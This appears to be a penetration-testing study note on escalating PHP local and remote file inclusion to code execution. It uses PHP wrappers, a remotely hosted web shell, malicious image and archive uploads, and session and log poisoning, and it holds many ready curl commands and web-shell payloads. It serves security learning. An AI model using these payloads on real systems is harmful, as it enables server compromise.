## 1- PHP Wrappers (LFI execute raw shell )

We can exploit **file inclusion vulnerabilities** not only to read local files but also to **execute code remotely** on the back-end server.  
Common ways to gain control include:

- Finding credentials (e.g., from `config.php`) and reusing them for SSH.
- Reading `.ssh/id_rsa` keys if permissions are weak.

However, we can also achieve **Remote Code Execution (RCE)** directly using **PHP Wrappers**, depending on server configuration.
These are the **three main PHP wrappers** for code execution via LFI:
- `data://`
- `php://input`
- `expect://`
##### Data Wrapper

The [`data`](https://www.php.net/manual/en/wrappers.data.php) wrapper allows including external data (like PHP code).  
- It only works if **`allow_url_include = On`** in `php.ini`.

To check this option on the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version

use LFI with the **base64 filter** to check this configuration: 
```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Decode and check the value:
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...' | base64 -d | grep allow_url_include
  # allow_url_include = On
```
If it’s enabled, we can use `data://` to inject and execute PHP code.

Create a web shell and base64 encode it:
```bash
echo '<?php system($_GET["cmd"]); ?>' | base64 #> PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Then include it using the wrapper:
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id" | grep uid
  # uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### Input Wrapper
The [`input`](https://www.php.net/manual/en/wrappers.php.php) wrapper allows including **POST data** as PHP code.  
- It also depends on `allow_url_include = On`.

Send the shell code via POST and execute commands with GET:
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- If our vulnerable parameter (ex. **?language=...**  ==did't  support the GET ,== put the command directly inside the PHP code, e.g. `<?php system('id'); ?>`.
#### Expect Wrapper

The [`expect`](https://www.php.net/manual/en/wrappers.expect.php) wrapper allows **direct command execution**.  
It must be **manually installed and enabled** in PHP.
Check if it’s active:
```bash
# get the conf file
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
# check
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...' | base64 -d | grep expect
  # extension=expect  --> it enable 
```

If enabled, execute commands directly:
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
The `expect` wrapper provides **direct RCE** through LFI and is also useful in **XXE attacks**.



---




## 2- Remote File Inclusion (RFI)

In some cases, we can include **remote files** instead of local ones through an **RFI vulnerability**, allowing:

- Enumeration of local-only ports/web apps (SSRF)
- Remote Code Execution (RCE) by including a malicious hosted script
#### Local vs Remote Inclusion
almost any RFI vulnerability is also an LFI vulnerabi , However, an LFI may not necessarily be an RFI. This is primarily because of three reasons:
- 1. The vulnerable function may not allow including remote URLs
- 2.  You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`).
- 3.The configuration may prevent RFI altogether (`allow_url_include = On`) , as most modern web servers disable including remote files by default.
 
 Common vulnerable functions:

|Function|Read|Execute|Remote URL|
|---|:-:|:-:|:-:|
|include()/include_once()|✅|✅|✅|
|file_get_contents()|✅|❌|✅|
|@Html.RemotePartial()|✅|❌|✅|

#### Verify RFI
any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled
To check this option on the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version

use LFI with the **base64 filter** to check this configuration: 
```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Decode and check the value:
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...' | base64 -d | grep allow_url_include
  # allow_url_include = On
```
If it’s enabled so RFI possible However, this may not always be reliable, So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`

We can test for RFI by including a local URL first:
```bash
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```
If the page includes and executes, it’s vulnerable.  
Be careful not to include the same vulnerable page (`index.php`), as it can cause a recursive loop (DoS).
#### Remote Code Execution

Create a simple web shell:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
##### HTTP

Host it with Python:
```bash
# shell.php on current directory (.) 
sudo python3 -m http.server 80
```
Then include it remotely:
```bash
http://<SERVER_IP>:<PORT>/?language=http://<OUR_IP>/shell.php&cmd=id
```
Check the request on your terminal to confirm it fetched `shell.php`.
##### FTP
Start an FTP server:
```bash
# shell.php on current directory (.) 
sudo python -m pyftpdlib -p 21
```
Include it via:
```bash
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id

# or with creds
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```
##### SMB (Windows)
If the target runs Windows, use SMB instead of HTTP/FTP:
```bash
# shell.php on current directory (.) 
impacket-smbserver -smb2support myshare .

# with creds
sudo impacket-smbserver -smb2support -username peon -password Pe0nP@ss share .
```
Then include your shell:
```bash
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\myshare\shell.php&cmd=whoami
```
This works even if `allow_url_include` is off, but is more reliable when both systems are on the same network.



---


## 3- LFI and File Uploads
File uploads are common in modern web apps and can extend **LFI vulnerabilities**.  
If the vulnerable function **executes code**, any uploaded file (even images) containing PHP code can lead to **Remote Code Execution (RCE)** when included via LFI.

|Function|Read|Execute|Remote URL|
|---|:-:|:-:|:-:|
|include()/include_once()|✅|✅|✅|
|require()/require_once()|✅|✅|❌|
|res.render()|✅|✅|❌|
|import|✅|✅|✅|
|include (.NET)|✅|✅|✅|
#### Image Upload
If we can upload images (e.g., avatars), we can hide PHP code inside them.and execute it with LFI vlub 
###### Crafting a Malicious Image
we will use an allowed image extension in our file name (e.g. `shell.gif`), and should also include the image magic bytes at the beginning of the file content (e.g. `GIF8`),
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

>**Note:** We are using a `GIF` image in this case since its magic bytes are easily typed,

Once uploaded, we can include it via LFI to execute code.
###### Finding the Uploaded File Path
After upload, check the page source for the image URL:
```html
<img src="/profile_images/shell.gif" class="profile-image">
```

Include it in the vulnerable parameter:
```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```
This executes the `id` command.

#### Zip Upload
We can use PHP’s `zip://` wrapper to execute code inside compressed archives.
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php
```
Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded). Finally, we can execute commands as we always do with `&cmd=id`, as follows:
```bash
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

# on url encoded (#)
# http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```
> Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.
#### Phar Upload
We can use the `phar://` wrapper for code execution.
**Create the Phar:**
This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```
Compile and rename it:
```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`), as follows:
```bash
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg/shell.txt&cmd=id
# on url encoded (/)
# http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

**Both the `zip` and `phar` wrapper methods should be considered as alternative methods in case the first method did not work**
>**Note:** There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the `phpinfo()` page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to [This Link](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo).



---


## 4- Log Poisoning
When a PHP file is included through an LFI and the include function has **execute privileges**, any PHP code inside that file runs on the server.  
Log poisoning abuses this behavior: we inject PHP code into a log file (like a session file or access log) that we can later include to execute commands.

If the web application can **read** these log files, we can exploit it.

|Function|Read|Execute|Remote URL|
|---|:-:|:-:|:-:|
|include()/include_once()|✅|✅|✅|
|require()/require_once()|✅|✅|❌|
|res.render() (NodeJS)|✅|✅|❌|
|import (Java)|✅|✅|✅|
|include (.NET)|✅|✅|✅|
#### PHP Session Poisoning
Web applications use **PHPSESSID** cookies to identify sessions.  
These sessions are stored in:

- Linux: `/var/lib/php/sessions/`
- Windows: `C:\Windows\Temp\`
Each session file name starts with ***"sess_" +session ID.*** ( followed by your session ID.)
Example:
```
/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3
```
If the session file contains parameters we control, we can poison it.

 **Check your session:**
Find your session ID (e.g. `PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd`)  
Then try including the session file through the LFI:
```bash
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
![[Pasted image 20251109211605.png]]
he `page` value is under our control, as we can control it through the `?language=` parameter
.We can do so by simply visiting the page with `?language=session_poisoning` specified, as follows:
```
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```
then the value inside the session file should change accordingly.

Now, let's include the session file once again to look at the contents:
```bash
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
![[Pasted image 20251109211816.png]]
*session_poisoning* confirms our ability to control the value of `page` in the session file.

write a basic PHP web shell by changing the `?language=` parameter to a URL encoded web shell, as follows:
```bash
http://<SERVER_IP>:<PORT>/index.php?language=<?php system($_GET["cmd"]); ?>

# url encoded
# http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Finally, we can include the session file and use the `&cmd=id` to execute a commands:
```bash
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

>Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction



#### Server Log Poisoning
**Apache** and **Nginx** store logs (like `access.log` and `error.log`) that record details about each request, including the **User-Agent** header — which you control.
If the web app can read these logs, you can inject PHP code into them and execute it via the LFI.

***Default log paths:***
- Apache (Linux): `/var/log/apache2/`
- Apache (Windows): `C:\xampp\apache\logs\`
- Nginx (Linux): `/var/log/nginx/`
- Nginx (Windows): `C:\nginx\log\`

If unknown, use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations

So, let's try including the Apache access log from `/var/log/apache2/access.log`, and see what we get:
```bash
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
   #=> we get the LOGS ....{ NORMAL USER AGENT HERE } ...
```
###### Poisoning via Burp
1. Send a normal LFI request. then   Change the **User-Agent** header to a PHP payload:
```bash
User-Agent: <?php system($_GET['cmd']); ?>
```
##### Poisoning via cUR:
```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

Now include the log:
```bash
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```
![[Pasted image 20251109213125.png]]
This should execute your command through the poisoned PHP code.
#### Extra locations

If you can’t read web logs, check other readable files that may store your input:
The `User-Agent` header is also shown on process files under the Linux `/proc/` directory.
- `/proc/self/environ`
- `/proc/self/fd/0-50`

some of the service logs we may be able to read, If accessible, you can poison these the same way (e.g., by logging in with a PHP payload as username).
- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

